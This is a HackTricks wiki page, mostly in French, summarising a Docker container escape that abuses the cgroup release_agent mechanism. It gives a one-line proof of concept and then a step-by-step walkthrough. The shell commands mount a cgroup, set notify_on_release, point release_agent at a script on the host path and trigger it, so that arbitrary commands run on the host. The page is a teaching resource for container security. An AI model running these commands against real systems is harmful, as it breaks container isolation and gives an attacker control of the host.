# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Pour plus de détails, consultez le** [**post de blog original**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ceci est juste un résumé :

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
La preuve de concept (PoC) démontre une méthode pour exploiter les cgroups en créant un fichier `release_agent` et en déclenchant son invocation pour exécuter des commandes arbitraires sur l'hôte du conteneur. Voici un aperçu des étapes impliquées :

1. **Préparer l'environnement :**
* Un répertoire `/tmp/cgrp` est créé pour servir de point de montage pour le cgroup.
* Le contrôleur de cgroup RDMA est monté sur ce répertoire. En cas d'absence du contrôleur RDMA, il est suggéré d'utiliser le contrôleur de cgroup `memory` comme alternative.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurer le Cgroup Enfant :**
* Un cgroup enfant nommé "x" est créé dans le répertoire cgroup monté.
* Les notifications sont activées pour le cgroup "x" en écrivant 1 dans son fichier notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurer l'Agent de Libération :**
* Le chemin du conteneur sur l'hôte est obtenu à partir du fichier /etc/mtab.
* Le fichier release\_agent du cgroup est ensuite configuré pour exécuter un script nommé /cmd situé au chemin hôte acquis.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Créer et configurer le script /cmd :**  
* Le script /cmd est créé à l'intérieur du conteneur et est configuré pour exécuter ps aux, redirigeant la sortie vers un fichier nommé /output dans le conteneur. Le chemin complet de /output sur l'hôte est spécifié.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Déclencher l'attaque :**
* Un processus est initié dans le cgroup enfant "x" et est immédiatement terminé.
* Cela déclenche le `release_agent` (le script /cmd), qui exécute ps aux sur l'hôte et écrit la sortie dans /output dans le conteneur.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
